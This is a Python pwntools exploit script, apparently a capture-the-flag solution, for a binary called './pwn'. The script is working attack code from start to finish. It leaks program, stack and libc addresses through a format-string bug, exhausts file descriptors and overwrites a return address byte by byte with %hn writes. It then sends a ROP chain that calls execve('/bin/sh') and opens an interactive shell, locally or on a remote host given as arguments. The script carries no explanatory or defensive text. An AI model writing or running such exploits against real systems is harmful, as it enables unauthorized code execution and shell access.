from pwn import *
from binascii import hexlify
import sys
context.arch = 'amd64'
context.terminal = ['tmux','sp','-h','-l','110']
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

def en(size,data):
    io.sendlineafter(">> ","1")
    io.sendlineafter(" : ",str(size))
    io.sendafter(" : ",data)
    print data
def de():
    io.sendlineafter(">> ","2")
def proof(chk=p64(0)):
    io.sendlineafter(">> ","3")
    io.sendafter("check:",chk)

x = sys.argv

while True:
        try:
                if(len(x)>=3):
                    io = remote(x[1],int(x[2]))
                else:
                    io = process("./pwn")
                io.sendlineafter(": ","3")
                en(8,"%9$p%8$p")
                io.recvuntil("0x")
                pbase = int(io.recv(12),16)-0x1140-0x8b+0xc
                io.recvuntil("0x")
                retad = int(io.recv(12),16)
                de()

                en(10,"%13$p%41$p")
                io.recvuntil("0x")
                lbase = (int(io.recv(12),16)-libc.sym['__libc_start_main'])&0xfffffffffffff000
                io.recvuntil("0x")
                pname = int(io.recv(12),16)
                de()
                info("PBASE -> %#x\nRETAD -> %#x\nLBASE -> %#x\nPNAME -> %#x"%(pbase,retad,lbase,pname))
                if(retad&0xffff>=10000 or (pbase+0x1260)&0xffff>=10000):
                        raise Exception("brutefore stack")

                for i in xrange(1536):
                        proof()#disable open -> the max limit of fd
                pop = pbase+0x1253
                bsh = retad
                sys = lbase+libc.sym['gets']
                fuck = lbase+0x10a38c
                en(12,"%"+"%d"%(retad&0xffff)+"c%15$hn");de()
                en(12,"%"+"%d"%(pop&0xff)+"c%41$hhn");de()
                en(12,"\0"*12);de()
                en(12,"%"+"%d"%((retad&0xff)+1)+"c%15$hhn");de()
                en(12,"\0"*12);de()
                en(12,"%"+"%d"%((pop>>8)&0xff)+"c%41$hhn");de()
                en(12,"\0"*12);de()
                en(12,"%"+"%d"%((retad+8)&0xff)+"c%15$hhn");de()
                en(12,"%"+"%d"%(bsh&0xff)+"c%41$hhn");de()
                #gdb.attach(io,'b *%#x+0xfd4'%pbase)
                for i in range(5):
                        en(12,"%"+"%d"%(((retad+8)&0xff)+i+1)+"c%15$hhn");de()
                        en(12,"\0"*12);de()
                        en(12,"%"+"%d"%((bsh>>(8*(i+1)))&0xff)+"c%41$hhn");de()
                for i in range(6):
                        en(12,"%"+"%d"%(((retad+0x10)&0xff)+i)+"c%15$hhn");de()
                        en(12,"%"+"%d"%((sys>>(8*i))&0xff)+"c%41$hhn");de()

                #gdb.attach(io,'b *%#x+0xd2975')

                en(12,"%"+"%d"%((retad-0x18)&0xffff)+"c%15$hn");de()
                en(12,'\0'*12);de()
                en(12,"%"+"%d"%((pbase+0x1250)&0xffff)+"c%41$hn")
                io.recv()
                syscall = lbase + 0xd2975
                pop_rdi = lbase + 0x2155f
                pop_rsi = lbase + 0x23e6a
                pop_rdx = lbase + 0x1b96
                pop_rax = lbase + 0x439c8
                payload = ''

                payload += '/bin/sh\0'+p64(fuck)*2
                payload += p64(pop_rdi)+p64(5)
                payload += p64(pop_rax)+p64(3)
                payload += p64(syscall)
                payload += p64(pop_rdi)+p64(6)
                payload += p64(pop_rax)+p64(3)
                payload += p64(syscall)
                payload += p64(pop_rdi)+p64(retad)
                payload += p64(pop_rsi)+p64(0)
                payload += p64(pop_rdx)+p64(0)
                payload += p64(pop_rax)+p64(0x3b)
                payload += p64(syscall)
                payload += p64(0)+p64(pbase+0xa10)
                payload += p64(retad+(0x7ffe6d841420-0x7ffe6d841340))
                payload += p64(pbase+0xa3a)
                payload += p64(retad+(0x7ffe6d841418-0x7ffe6d841340))
                payload += p64(0x1c)+p64(1)
                payload += p64(pname)

                io.sendline(payload)
                io.interactive()
        except Exception,e:
                info(str(Exception)+str(e))
                io.close()

